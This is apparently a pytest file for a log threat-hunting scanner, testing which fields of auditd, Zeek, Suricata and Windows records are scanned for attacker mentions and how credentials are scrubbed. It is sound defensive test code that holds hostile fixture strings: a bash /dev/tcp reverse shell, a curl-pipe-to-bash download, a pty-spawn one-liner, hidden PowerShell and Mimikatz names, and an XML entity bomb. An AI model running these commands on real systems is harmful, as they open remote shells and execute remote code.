"""Mention coverage: every offered record's free-text fields are scanned by a documented selection per family (never
a serialized record), audit fields no typed event reads and Windows records on a network target are offered, the
records outside the sweep's selection are fetched for the scan under a bounded budget, and a mention whose record a
finding also cites is shown with that finding, never dropped. Mentions never become findings, lanes or facts."""
from __future__ import annotations

import json
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest

from romulus.content.mention_patterns import load_mention_patterns
from romulus.hunt.mention_fields import (
    AUDITD,
    ECS_JSON,
    EVE,
    JOURNALD,
    JSON_RECORD,
    MAX_TEXTS,
    NO_LINE,
    ZEEK,
    select_texts,
)
from romulus.hunt.mentions import SCANNED_ALL, MentionScanner
from romulus.sources.models import Window
from romulus.sources.profile import contract_from_types

FIXTURES = Path(__file__).parent / "data" / "mentions"
T0 = datetime(2024, 11, 18, 14, 0, tzinfo=UTC)
WINDOW = Window(start=T0, end=T0 + timedelta(minutes=5))
TARGET = "logs-linux-x"
SHELL = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
CONTRACT = contract_from_types(TARGET, {"@timestamp": "date", "event.dataset": "keyword", "host.name": "keyword",
                                        "message": "text", "event.module": "keyword", "input.type": "keyword"})


def _hex(text: str) -> str:
    return text.encode().hex().upper()


def _record(n: int, source: dict, host: str = "web1") -> dict:
    return {"_index": TARGET, "_id": f"c{n}",
            "_source": {"@timestamp": (T0 + timedelta(seconds=n)).isoformat(), "host": {"name": host}, **source}}


def _scanner(tmp_path) -> MentionScanner:
    return MentionScanner("h1", load_mention_patterns(FIXTURES), stage_dir=tmp_path, window=(WINDOW.start, WINDOW.end))


def _ids(scanner) -> list[tuple[str, str, str]]:
    """(pattern, host, the field the kept record was matched in) per kept group."""
    patterns = scanner.patterns.patterns
    out = []
    for row in scanner.ranked():
        query = json.loads(row[7])["query"]
        out.append((patterns[row[1]].id, row[2], query.split("matched the record's ", 1)[1].split(" in the ")[0]))
    return sorted(out)


# ---- the selection, family by family ------------------------------------------------------------------------------

def test_an_audit_proctitle_is_scanned_decoded_never_as_hex(tmp_path):
    line = (f"type=PROCTITLE msg=audit(1731938400.123:77): proctitle={_hex(SHELL.replace(' ', chr(0)))}")
    selection = select_texts({"message": line})
    assert selection.family == AUDITD and selection.complete
    assert selection.texts == [("PROCTITLE.proctitle", SHELL)]
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, {"message": line}), "x", False, ("proctitle",))], None)
    assert _ids(scanner) == [("mention.test_dev_tcp_redirect", "web1", "PROCTITLE.proctitle")]
    summary = scanner.summary()
    assert summary["status"] == SCANNED_ALL and summary["by_field"] == {"auditd:PROCTITLE.proctitle": 1}
    scanner.close()


def test_an_audit_user_command_and_execve_arguments_are_decoded():
    user_cmd = (f"type=USER_CMD msg=audit(1731938400.5:9): pid=4 uid=0 auid=1000 ses=2 msg='cwd=\"/root\" "
                f"cmd={_hex('curl http://198.51.100.2/x | bash')} exe=\"/usr/bin/sudo\" terminal=pts/0 res=success'")
    texts = dict(select_texts({"event": {"original": user_cmd}}).texts)
    assert texts["USER_CMD.cmd"] == "curl http://198.51.100.2/x | bash"
    execve = f'type=EXECVE msg=audit(1731938400.5:10): argc=3 a0="bash" a1="-c" a2={_hex("id; whoami")}'
    assert dict(select_texts({"message": execve}).texts)["EXECVE.argv"] == "bash -c id; whoami"
    # restricted to the process title, a record's other fields are not read
    assert select_texts({"message": execve}, only=("proctitle",)).texts == []


def test_a_journal_record_has_its_command_line_scanned_beside_its_message(tmp_path):
    journal = {"event": {"dataset": "systemd.journal"},
               "event.original": json.dumps({"MESSAGE": "started", "_CMDLINE": SHELL, "_COMM": "bash",
                                             "SYSLOG_IDENTIFIER": "logger", "_PID": "7"})}
    selection = select_texts(journal)
    assert selection.family == JOURNALD and selection.complete
    assert ("event.original#journal:_CMDLINE", SHELL) in selection.texts
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, journal), "x")], None)
    assert _ids(scanner) == [("mention.test_dev_tcp_redirect", "web1", "event.original#journal:_CMDLINE")]
    assert scanner.summary()["status"] == SCANNED_ALL
    scanner.close()


def test_a_json_record_without_message_is_scanned_by_its_command_line_field(tmp_path):
    ecs = {"event": {"original": json.dumps({"@timestamp": T0.isoformat(), "process": {
        "command_line": SHELL, "pid": 9}, "event": {"category": ["process"]}})}}
    selection = select_texts(ecs)
    assert selection.family == ECS_JSON and selection.complete
    assert selection.texts == [("event.original#process.command_line", SHELL)]
    # a JSON record of no catalogued family is never substring-matched: counted and named
    other = {"event": {"original": json.dumps({"cmd": SHELL})}}
    assert select_texts(other).texts == [] and select_texts(other).reason == JSON_RECORD
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, ecs), "x"), (_record(2, other), "x")], None)
    assert _ids(scanner) == [("mention.test_dev_tcp_redirect", "web1", "event.original#process.command_line")]
    summary = scanner.summary()
    assert summary["not_scanned"]["records"] == {JSON_RECORD: 1} and summary["status"] == "partial"
    scanner.close()


def test_suricata_eve_records_are_read_by_their_event_types_fields(tmp_path):
    http = {"event_type": "http", "src_ip": "10.0.0.5", "dest_ip": "203.0.113.9", "flow_id": 1,
            "http": {"hostname": "x.example", "url": "/a?c=bash%20-i", "http_user_agent": "MIMIKATZ/2.2"},
            "alert": {"signature": "ET MIMIKATZ rule text"}}
    selection = select_texts({"event.original": json.dumps(http)})
    assert selection.family == EVE and selection.complete
    assert [path for path, _text in selection.texts] == [
        "event.original#eve:http.hostname", "event.original#eve:http.url", "event.original#eve:http.http_user_agent"]
    dns = {"event_type": "dns", "src_ip": "10.0.0.5", "dns": {"version": 3, "queries": [
        {"rrname": "a.example"}, {"rrname": "b.example"}]}}
    assert [text for _path, text in select_texts({"event.original": json.dumps(dns)}).texts] == [
        "a.example", "b.example"]
    # counters have no free text: nothing to scan, and no coverage gap
    stats = select_texts({"event.original": json.dumps({"event_type": "stats", "flow_id": 1, "stats": {"x": 1}})})
    assert stats.no_text and stats.family == EVE
    # an event type outside the table is scanned by the table's fields, in part
    odd = select_texts({"event.original": json.dumps({"event_type": "newproto", "src_ip": "1.2.3.4",
                                                         "http": {"url": "/x"}})})
    assert odd.texts == [("event.original#eve:http.url", "/x")] and not odd.complete
    scanner = _scanner(tmp_path)
    records = [(_record(1, {"event.original": json.dumps(http)}), "x"),
               (_record(2, {"event.original": json.dumps({"event_type": "stats", "flow_id": 1})}), "x")]
    scanner.scan(TARGET, CONTRACT, records, None)
    summary = scanner.summary()
    assert _ids(scanner) == [("mention.test_mimikatz", "web1", "event.original#eve:http.http_user_agent")]
    assert summary["status"] == SCANNED_ALL and summary["records_without_free_text"] == {EVE: 1}
    scanner.close()


def test_zeek_records_are_read_by_their_logs_fields():
    http = {"_path": "http", "uid": "C1", "id.orig_h": "10.0.0.5", "uri": "/x", "user_agent": "curl/8",
            "resp_mime_types": ["text/html"]}
    selection = select_texts({"event.original": json.dumps(http)})
    assert selection.family == ZEEK and selection.complete
    assert selection.texts == [("event.original#zeek:uri", "/x"), ("event.original#zeek:user_agent", "curl/8")]
    unknown = select_texts({"event.original": json.dumps({"_path": "custom_log", "uid": "C2", "msg": "hello"})})
    assert unknown.texts == [("event.original#zeek:msg", "hello")] and not unknown.complete


def test_a_windows_record_without_a_rendered_message_is_read_by_its_event_data(tmp_path):
    source = {"winlog": {"channel": "Vendor/Operational", "event_id": 7, "event_data": {
        "CommandLine": "powershell -nop -w hidden -c MIMIKATZ", "SubjectUserSid": "S-1-5-18"}},
        "agent": {"type": "winlogbeat"}}
    selection = select_texts(source, windows=True)
    assert selection.texts == [("winlog.event_data.CommandLine", "powershell -nop -w hidden -c MIMIKATZ")]
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, source, host="ws1"), "x", True)], None)
    assert _ids(scanner) == [("mention.test_mimikatz", "ws1", "winlog.event_data.CommandLine")]
    summary = scanner.summary()
    assert summary["by_telemetry"] == {"windows_text": 1}
    # with no message line, the record's other event data is not read: scanned in part, never "every offered record"
    assert not selection.complete and summary["not_scanned"]["records_in_part"] == {NO_LINE: 1}
    assert summary["status"] == "partial" and f"1 record(s) scanned only in part: {NO_LINE}" in summary["reasons"]
    scanner.close()


@pytest.mark.parametrize(("key", "value"), [
    ("SourceImage", "C:\\t\\mimikatz.exe"), ("TargetImage", "C:\\t\\mimikatz.exe"), ("StartModule", "mimikatz.dll"),
    ("StartFunction", "mimikatz"), ("TaskName", "\\mimikatz"), ("ServiceName", "mimikatz"),
    ("Threat Name", "HackTool:Win32/Mimikatz"), ("Path", "file:_C:\\t\\mimikatz.exe"),
    ("FilePath", "%OSDRIVE%\\T\\MIMIKATZ.EXE"), ("FullFilePath", "C:\\T\\MIMIKATZ.EXE"),
    ("Contents", "mimikatz sekurlsa"), ("DestinationHostname", "mimikatz.example"),
])
def test_windows_event_data_names_that_carry_attacker_text_are_read(key, value):
    selection = select_texts({"winlog": {"event_data": {key: value}}, "message": "event"}, windows=True)
    assert (f"winlog.event_data.{key}", value) in selection.texts


@pytest.mark.parametrize(("source", "field"), [
    ({"message": "x", "dns": {"answers": [{"data": "mimikatz.example"}]}}, "dns.answers.data"),
    ({"message": "x", "url": {"domain": "mimikatz.example"}}, "url.domain"),
    ({"message": "x", "registry": {"path": "HKLM\\mimikatz"}}, "registry.path"),
    ({"message": "x", "file": {"name": "mimikatz.exe"}}, "file.name"),
    ({"message": "x", "process": {"parent": {"name": "mimikatz.exe"}}}, "process.parent.name"),
])
def test_ecs_names_that_carry_attacker_text_are_read(source, field):
    assert field in dict(select_texts(source).texts)


_EVENT_XML = ('<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>1</EventID>'
              '</System><EventData><Data Name="CommandLine">powershell MIMIKATZ</Data>'
              '<Data Name="SubjectUserSid">S-1-5-18</Data></EventData>{rendering}</Event>')


def test_a_windows_record_whose_only_text_is_its_exported_xml_is_read_by_its_event_data(tmp_path):
    plain = select_texts({"event": {"original": _EVENT_XML.format(rendering="")}})
    assert plain.texts == [("event.original#xml:EventData.CommandLine", "powershell MIMIKATZ")]
    assert not plain.complete
    rendered = select_texts({"event": {"original": _EVENT_XML.format(
        rendering="<RenderingInfo><Message>A process was created.</Message></RenderingInfo>")}})
    assert rendered.complete and rendered.texts[0] == ("event.original#xml:RenderingInfo.Message",
                                                       "A process was created.")
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, {"event": {"original": _EVENT_XML.format(rendering="")}},
                                     host="ws1"), "x", True)], None)
    assert _ids(scanner) == [("mention.test_mimikatz", "ws1", "event.original#xml:EventData.CommandLine")]
    scanner.close()


def test_zeek_ldap_logs_are_read_by_their_documented_fields():
    search = {"_path": "ldap_search", "uid": "C1", "id.orig_h": "10.0.0.5", "base_object": "CN=MIMIKATZ,DC=x"}
    selection = select_texts({"event": {"original": json.dumps(search)}})
    assert selection.complete and selection.texts == [("event.original#zeek:base_object", "CN=MIMIKATZ,DC=x")]


def test_an_eve_payload_never_read_makes_the_record_scanned_in_part(tmp_path):
    from romulus.hunt.mention_fields import EVE_PAYLOAD
    alert = {"event_type": "alert", "src_ip": "1.2.3.4", "flow_id": 1, "alert": {"signature": "x"},
             "payload_printable": "cmd.exe /c mimikatz"}
    selection = select_texts({"event": {"original": json.dumps(alert)}})
    assert selection.texts == [] and not selection.complete and selection.reason == EVE_PAYLOAD
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, {"event": {"original": json.dumps(alert)}}), "x")], None)
    summary = scanner.summary()
    assert summary["not_scanned"]["records_in_part"] == {EVE_PAYLOAD: 1}
    assert summary["records_without_free_text"] == {} and summary["status"] == "partial"
    scanner.close()


@pytest.mark.parametrize("source", [
    {"event": {"original": json.dumps({"event_type": "dns", "src_ip": "1.2.3.4", "dns": {
        "queries": [{"rrname": f"h{n % 3}.example"} for n in range(80)]}})}},
    {"message": "x", "process": {"args": [f"a{n % 3}" for n in range(80)]}},
    {"message": "x", "process": {"args": [["nested", ["deeper"]]]}},
])
def test_a_list_or_nesting_cut_at_its_bound_makes_the_record_scanned_in_part(source):
    from romulus.hunt.mention_fields import TRUNCATED
    selection = select_texts(source)
    assert selection.texts and not selection.complete and selection.reason == TRUNCATED
    # the bound is per record: the next record is judged on its own
    assert select_texts({"message": "x", "process": {"args": ["a"]}}).complete


def test_an_xml_document_declaring_entities_is_never_parsed():
    from romulus.hunt.mention_fields import XML_UNREAD
    bomb = ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>'
            '<Event><EventData><Data Name="CommandLine">&lol2;</Data></EventData></Event>')
    selection = select_texts({"event": {"original": bomb}})
    assert selection.texts == [] and selection.reason == XML_UNREAD


def test_a_suricata_alert_is_read_by_the_application_block_it_carries_never_by_its_rule_text():
    alert = {"event_type": "alert", "src_ip": "10.0.0.5", "flow_id": 9,
             "alert": {"signature": "ET MIMIKATZ download", "metadata": {"tag": ["MIMIKATZ"]}},
             "http": {"url": "/x.ps1", "http_user_agent": "MIMIKATZ"}}
    selection = select_texts({"event.original": json.dumps(alert)})
    assert selection.complete and dict(selection.texts) == {"event.original#eve:http.url": "/x.ps1",
                                                            "event.original#eve:http.http_user_agent": "MIMIKATZ"}


def test_a_lone_surrogate_in_a_record_never_costs_the_page(tmp_path):
    hits = [_record(1, {"message": "MIMIKATZ \ud800 here"}, host="ws\udc00one"),
            _record(2, {"message": f"x {SHELL}"}, host="web2")]
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(hit, "x") for hit in hits], None, residue=True)
    rows = list(scanner.ranked())
    assert sorted(scanner.patterns.patterns[row[1]].id for row in rows) == ["mention.test_dev_tcp_redirect",
                                                                          "mention.test_mimikatz"]
    assert all("\ud800" not in row[8] and "\udc00" not in row[2] for row in rows)
    assert scanner.summary()["status"] == SCANNED_ALL
    scanner.close()


def test_a_message_and_a_command_line_field_are_two_texts_but_one_mention(tmp_path):
    source = {"message": "process started", "process": {"command_line": SHELL, "name": "MIMIKATZ"}}
    selection = select_texts(source)
    assert [path for path, _text in selection.texts] == ["message", "process.command_line", "process.name"]
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, source), "x")], None)
    rows = list(scanner.ranked())
    # one record, one group: under its strongest pattern, the weaker one kept as metadata
    assert len(rows) == 1 and scanner.patterns.patterns[rows[0][1]].id == "mention.test_dev_tcp_redirect"
    assert [scanner.patterns.patterns[i].id for i in json.loads(rows[0][14])] == ["mention.test_mimikatz"]
    summary = scanner.summary()
    assert summary["lines_scanned"] == 3 and summary["records_scanned"] == 1 and summary["lines_matched"] == 1
    scanner.close()


def test_a_record_with_too_many_fields_or_text_past_the_bound_is_counted_in_part(tmp_path):
    from romulus.evidence.mention_match import MAX_SCAN_CHARS
    many = {"event.original": json.dumps({"event_type": "smtp", "src_ip": "1.2.3.4", "smtp": {
        "rcpt_to": [f"u{n}@example.org" for n in range(MAX_TEXTS + 5)]}})}
    selection = select_texts(many)
    assert len(selection.texts) == MAX_TEXTS and not selection.complete
    # the scan bound holds across a record's texts together
    long = {"message": "x" * (MAX_SCAN_CHARS - 10), "process": {"command_line": "MIMIKATZ " + "y" * 100}}
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, long), "x")], None)
    summary = scanner.summary()
    assert summary["not_scanned"]["lines_cut_at_bound"] == 1 and summary["status"] == "partial"
    assert summary["not_scanned"]["chars_past_bound"] == len("MIMIKATZ ") + 100 - 10
    scanner.close()


def test_a_credential_is_never_selected_and_a_scrubbed_record_is_scanned_as_stored(tmp_path):
    eve = {"event_type": "ftp", "src_ip": "10.0.0.5", "flow_id": 3,
           "ftp": {"command": "PASS", "command_data": "MIMIKATZ-secret"}}
    assert select_texts({"event.original": json.dumps(eve)}).texts == [("event.original#eve:ftp.command", "PASS")]
    zeek = {"_path": "ftp", "uid": "C1", "id.orig_h": "10.0.0.5", "command": "pass", "arg": "MIMIKATZ-secret"}
    assert [path for path, _text in select_texts({"event.original": json.dumps(zeek)}).texts] == [
        "event.original#zeek:command"]
    retr = {**eve, "ftp": {"command": "RETR", "command_data": "/tmp/MIMIKATZ.exe"}}
    assert dict(select_texts({"event.original": json.dumps(retr)}).texts) == {
        "event.original#eve:ftp.command": "RETR", "event.original#eve:ftp.command_data": "/tmp/MIMIKATZ.exe"}


_SECRET = "S3cretPw77"
_CREDENTIAL_CASES = {
    "zeek irc PASS": {"event": {"original": json.dumps({"_path": "irc", "uid": "C1", "id.orig_h": "10.0.0.5",
                                                        "command": "PASS", "value": _SECRET, "nick": "bob"})}},
    "zeek irc PASS by dataset": {"event": {"dataset": "zeek.irc", "original": json.dumps({
        "uid": "C1", "id.orig_h": "10.0.0.5", "command": "PASS", "value": _SECRET})}},
    "zeek mysql IDENTIFIED BY": {"event": {"original": json.dumps({
        "_path": "mysql", "uid": "C1", "id.orig_h": "10.0.0.5", "cmd": "query",
        "arg": f"CREATE USER x IDENTIFIED BY '{_SECRET}'"})}},
    "zeek ftp ADAT": {"event": {"original": json.dumps({"_path": "ftp", "uid": "C1", "id.orig_h": "10.0.0.5",
                                                        "command": "ADAT", "arg": _SECRET})}},
    "zeek unknown log argument": {"event": {"original": json.dumps({"_path": "custom", "uid": "C1",
                                                                     "id.orig_h": "10.0.0.5", "arg": _SECRET})}},
    "zeek unknown log argument column": {"event": {"original": json.dumps({
        "_path": "custom_auth", "uid": "C1", "id.orig_h": "10.0.0.5", "argument": _SECRET, "username": "bob"})}},
    "zeek unknown log filter column": {"event": {"original": json.dumps({
        "_path": "custom_dir", "uid": "C1", "id.orig_h": "10.0.0.5", "filter": f"(userPassword={_SECRET})"})}},
    "ecs request body": {"message": "POST /login", "http": {"request": {"body": {
        "content": f"user=bob&password={_SECRET}"}}}},
    "ecs request body flat": {"message": "POST /login", "http.request.body.content": f"pw={_SECRET}"},
    "ecs url query parameter": {"message": "GET", "url": {"original": f"/a?password={_SECRET}&x=1",
                                                          "query": f"token={_SECRET}&x=1"}},
    "ecs json body and url in original": {"event": {"original": json.dumps({
        "@timestamp": "t", "http": {"request": {"body": {"content": f"password={_SECRET}"}}},
        "url": {"full": f"http://bob:{_SECRET}@h/x?key={_SECRET}"}})}},
    "message userinfo": {"message": f"curl http://bob:{_SECRET}@10.0.0.9/x | sh"},
    "message credential parameter": {"message": f"GET /api?api_key={_SECRET} 200"},
    "eve body short name": {"event": {"original": json.dumps({
        "event_type": "http", "src_ip": "1.2.3.4", "flow_id": 1,
        "http": {"url": "/x", "http_request_body_printable": f"username=bob&pw={_SECRET}"}})}},
    "eve payload PASS line": {"event": {"original": json.dumps({
        "event_type": "alert", "src_ip": "1.2.3.4", "flow_id": 1, "alert": {"signature": "x"},
        "payload_printable": f"USER bob\\r\\nPASS {_SECRET}"})}},
    "zeek uri userinfo": {"event": {"original": json.dumps({"_path": "http", "uid": "C1", "id.orig_h": "10.0.0.5",
                                                            "uri": f"http://bob:{_SECRET}@x/y"})}},
    "zeek in message": {"message": json.dumps({"_path": "irc", "uid": "C1", "id.orig_h": "10.0.0.5",
                                               "command": "PASS", "value": _SECRET})},
    "eve http2 credential headers": {"event": {"original": json.dumps({
        "event_type": "http2", "src_ip": "1.2.3.4", "flow_id": 1, "http2": {"request_headers": [
            {"name": "authorization", "value": f"Basic {_SECRET}"}, {"name": "cookie", "value": f"s={_SECRET}"},
            {"name": "Proxy-Authorization", "value": _SECRET}, {"name": "set-cookie", "value": _SECRET},
            {"name": "user-agent", "value": "MIMIKATZ"}]}})}},
    "eve request body": {"event": {"original": json.dumps({
        "event_type": "http", "src_ip": "1.2.3.4", "flow_id": 1,
        "http": {"url": "/login", "http_request_body_printable": f"user=bob&password={_SECRET}"}})}},
    "eve sip userinfo": {"event": {"original": json.dumps({
        "event_type": "sip", "src_ip": "1.2.3.4", "flow_id": 1,
        "sip": {"request_line": f"REGISTER sip:bob:{_SECRET}@x SIP/2.0", "uri": f"sip:bob:{_SECRET}@x"}})}},
    "eve ftp ADAT": {"event": {"original": json.dumps({"event_type": "ftp", "src_ip": "1.2.3.4", "flow_id": 1,
                                                       "ftp": {"command": "ADAT", "command_data": _SECRET}})}},
    "eve pgsql password": {"event": {"original": json.dumps({
        "event_type": "pgsql", "src_ip": "1.2.3.4", "flow_id": 1,
        "pgsql": {"request": {"simple_query": f"ALTER ROLE x PASSWORD '{_SECRET}'"}}})}},
    "ecs url userinfo": {"message": "GET", "url": {"full": f"http://bob:{_SECRET}@host/x",
                                                   "original": f"http://bob:{_SECRET}@host/x", "password": _SECRET}},
}


@pytest.mark.parametrize("case", sorted(_CREDENTIAL_CASES))
def test_a_telemetry_credential_is_neither_scanned_nor_kept(case):
    from romulus.evidence.raw_scrub import clean_source
    from romulus.hunt.mention_fields import scrub_source
    stored = scrub_source(clean_source(_CREDENTIAL_CASES[case]))
    assert _SECRET not in json.dumps(stored)
    assert all(_SECRET not in text for _path, text in select_texts(stored).texts)
    # even unscrubbed, the selection never reads a credential position
    assert all(_SECRET not in text for _path, text in select_texts(_CREDENTIAL_CASES[case]).texts
               if case not in {"zeek mysql IDENTIFIED BY", "eve pgsql password", "zeek uri userinfo"})


def test_the_kept_record_of_a_mention_is_scrubbed_whatever_recognised_its_family(tmp_path):
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, _CREDENTIAL_CASES["eve http2 credential headers"]), "x")], None)
    rows = list(scanner.ranked())
    assert [scanner.patterns.patterns[row[1]].id for row in rows] == ["mention.test_mimikatz"]
    assert _SECRET not in rows[0][7] and _SECRET not in rows[0][8]
    scanner.close()


def test_json_held_in_the_message_is_read_by_its_family_never_as_a_serialized_line(tmp_path):
    from romulus.hunt.mention_fields import JSON_MESSAGE
    alert = {"event_type": "alert", "src_ip": "1.2.3.4", "flow_id": 1, "alert": {"signature": "ET MIMIKATZ"}}
    selection = select_texts({"message": json.dumps(alert)})
    # the sensor's rule text is never read, and no key name is scanned
    assert selection.family == EVE and selection.texts == []
    zeek = {"_path": "http", "uid": "C1", "id.orig_h": "10.0.0.5", "uri": "/MIMIKATZ.ps1"}
    assert select_texts({"message": json.dumps(zeek)}).texts == [("message#zeek:uri", "/MIMIKATZ.ps1")]
    other = select_texts({"message": json.dumps({"cmd": SHELL, "note": "x"})})
    assert other.texts == [] and other.reason == JSON_MESSAGE and not other.complete
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, [(_record(1, {"message": json.dumps({"cmd": SHELL})}), "x")], None)
    summary = scanner.summary()
    assert summary["lines_matched"] == 0 and summary["not_scanned"]["records"] == {JSON_MESSAGE: 1}
    assert summary["status"] == "partial"
    scanner.close()
    # a message that only starts like JSON is a line like any other
    assert select_texts({"message": "{not json} " + SHELL}).texts[0][0] == "message"


@pytest.mark.parametrize("source", [
    {"event": {"original": json.dumps({"MESSAGE": "x", "_CMDLINE": "MIMIKATZ"})}},
    {"event": {"original": json.dumps({"@timestamp": "t", "process": {"command_line": "MIMIKATZ"}})}},
])
def test_selected_fields_never_include_keys_or_structure(source):
    texts = [text for _path, text in select_texts(source).texts]
    assert all("{" not in text and "_CMDLINE" not in text and "command_line" not in text for text in texts)


# ---- what normalization offers to the scan ------------------------------------------------------------------------

def _audit_hit(_id: str, raw: str, t: float) -> dict:
    return {"_id": _id, "_index": TARGET, "_source": {
        "@timestamp": datetime.fromtimestamp(t, UTC).isoformat(), "message": raw, "host": {"name": "web1"},
        "event": {"dataset": "linux.audit", "original": raw}}}


def test_audit_text_no_typed_event_reads_is_offered_and_the_rest_is_not(tmp_path):
    from romulus.evidence.normalize import AUDIT_NO_EVENT, AUDIT_PROCTITLE_UNREAD, normalize_hits
    from tests.test_lineage_observations import SADDR_EXT_554, _syscall
    t = 1731938400.0
    # a socket group: its connect is typed (net_socket), its process title (the calling command line) is read by no
    # typed field and holds attacker text
    title = chr(0).join(["python3", "-c", "import pty;pty.spawn(1);" + SHELL])
    socket = [_audit_hit("s1", _syscall(t, 1, nr=42, name="connect", pid=50, ppid=40, exe="/usr/bin/python3",
                                        comm="python3", a2="10", success="no", exit_code="-115"), t),
              _audit_hit("s2", f"type=SOCKADDR msg=audit({t:.3f}:1): saddr={SADDR_EXT_554}", t),
              _audit_hit("s3", f"type=PROCTITLE msg=audit({t:.3f}:1): proctitle={_hex(title)}", t)]
    # an exec group: its process title is the command line the exec event already reads
    execve = [_audit_hit("e1", f'type=EXECVE msg=audit({t + 1:.3f}:2): argc=3 a0="bash" a1="-c" a2={_hex(SHELL)}',
                         t + 1),
              _audit_hit("e2", _syscall(t + 1, 2, nr=59, name="execve", pid=51, ppid=40, exe="/usr/bin/bash",
                                        comm="bash"), t + 1),
              _audit_hit("e3", f"type=PROCTITLE msg=audit({t + 1:.3f}:2): proctitle={_hex('bash')}", t + 1)]
    # a sudo command record: no typed event, so every free-text field is offered
    sudo = [_audit_hit("u1", f"type=USER_CMD msg=audit({t + 2:.3f}:3): pid=4 uid=0 auid=1000 ses=2 "
                             f"msg='cwd=\"/root\" cmd={_hex('MIMIKATZ --dump')} exe=\"/usr/bin/sudo\" res=success'",
                        t + 2)]
    unread: list = []
    events, _skips, errors = normalize_hits([*socket, *execve, *sudo], unread=unread)
    assert errors == [] and {event.family for event in events} >= {"net_socket", "process_exec"}
    assert [(entry[0]["_id"], entry[1], entry[3] if len(entry) > 3 else None) for entry in unread] == [
        ("s3", AUDIT_PROCTITLE_UNREAD, ("proctitle",)), ("u1", AUDIT_NO_EVENT, None)]
    scanner = _scanner(tmp_path)
    scanner.scan(TARGET, CONTRACT, unread, None)
    assert _ids(scanner) == [("mention.test_dev_tcp_redirect", "web1", "PROCTITLE.proctitle"),
                             ("mention.test_mimikatz", "web1", "USER_CMD.cmd")]
    assert scanner.summary()["status"] == SCANNED_ALL
    scanner.close()


@pytest.mark.parametrize("shape", ["dev", "filebeat", "agent_fields", "auditbeat_array", "auditd_manager_joined"])
def test_a_socket_groups_process_title_is_offered_in_every_shipper_shape(shape):
    from romulus.evidence.normalize import normalize_hits
    from tests import linux_shipper_fixtures as f
    lines = f.connect_lines()
    docs = {"dev": lambda: f.dev_audit(lines), "filebeat": lambda: f.filebeat_audit(lines),
            "agent_fields": lambda: f.agent_audit(lines),
            "auditbeat_array": lambda: [f.auditbeat_raw(lines)],
            "auditd_manager_joined": lambda: [f.auditbeat_raw(lines, joined=True)]}[shape]()
    unread: list = []
    events, _skips, errors = normalize_hits(docs, unread=unread)
    assert errors == [] and [event.family for event in events] == ["net_socket"]
    titles = [text for entry in unread for _path, text in select_texts(entry[0]["_source"], only=entry[3]).texts]
    # the calling process's command line, decoded (a shipper's own NUL rendering kept as it wrote it)
    assert len(titles) == 1 and titles[0].replace("^@", " ") == "curl http://203.0.113.5/"


def test_a_shipper_value_that_only_looks_like_hex_is_kept_as_written():
    texts = [text for _path, text in select_texts({"auditd": {"data": {"name": "cafe"}}, "message": "x"}).texts]
    assert "cafe" in texts
    titles = select_texts({"auditd": {"log": {"proctitle": "deadbeef"}}}, only=("proctitle",)).texts
    assert ("auditd.log.proctitle", "deadbeef") in titles
    encoded = select_texts({"auditd": {"log": {"proctitle": _hex("curl\x00http://x/MIMIKATZ")}}}, only=("proctitle",))
    assert encoded.texts == [("auditd.log.proctitle", "curl http://x/MIMIKATZ")]


def test_an_audit_record_that_does_not_parse_is_offered_as_plain_text():
    from romulus.evidence.normalize import normalize_hits
    broken = _audit_hit("b1", 'type=SYSCALL msg=audit(1731938400.0:5): comm="x" exe="/tmp/MIMIKATZ', 1731938400.0)
    unread: list = []
    _events, _skips, errors = normalize_hits([broken], unread=unread)
    assert errors and [entry[0]["_id"] for entry in unread] == ["b1"]
    selection = select_texts(broken["_source"])
    assert selection.texts and not selection.complete


def test_a_windows_record_on_a_network_target_is_offered_and_still_counted_as_not_evaluated(tmp_path):
    from romulus.evidence.normalize import normalize_hits
    network = contract_from_types("net-x", {"@timestamp": "date", "event.dataset": "keyword"}, role="network")
    record = {"_index": "net-x", "_id": "w9", "_source": {
        "@timestamp": T0.isoformat(), "agent": {"type": "winlogbeat"}, "host": {"name": "dc1"},
        "winlog": {"channel": "Security", "provider_name": "Microsoft-Windows-Security-Auditing", "event_id": 4688,
                   "record_id": 1, "computer_name": "dc1",
                   "event_data": {"NewProcessName": "C:\\t\\m.exe", "CommandLine": "m.exe MIMIKATZ"}},
        "event": {"code": "4688"}, "message": "A new process has been created. MIMIKATZ"}}
    unread: list = []
    events, skips, _errors = normalize_hits([record], contract=network, unread=unread)
    assert events == [] and skips == {"Windows event records on a network target: not evaluated": 1}
    assert [(entry[0]["_id"], entry[2]) for entry in unread] == [("w9", True)]
    scanner = _scanner(tmp_path)
    scanner.scan("net-x", network, unread, None)
    assert [scanner.patterns.patterns[row[1]].id for row in scanner.ranked()] == ["mention.test_mimikatz"]
    assert scanner.summary()["by_telemetry"] == {"windows_text": 1}
    scanner.close()


# ---- the records outside the sweep's selection --------------------------------------------------------------------

def _value(source: dict, field: str):
    field = field.removesuffix(".keyword")
    if field in source:
        return source[field]
    node = source
    for part in field.split("."):
        if not isinstance(node, dict) or part not in node:
            return None
        node = node[part]
    return node


def matches(query: dict, source: dict) -> bool:
    """A small evaluator of the compiled query shapes the sweep and the residue pass send (the window's range always
    holds here)."""
    (kind, body), = query.items()
    if kind == "bool":
        if not all(matches(item, source) for key in ("filter", "must") for item in body.get(key, [])):
            return False
        if any(matches(item, source) for item in body.get("must_not", [])):
            return False
        should = body.get("should", [])
        return not should or sum(matches(item, source) for item in should) >= body.get("minimum_should_match", 1)
    if kind == "range":
        return True
    if kind == "match_all":
        return True
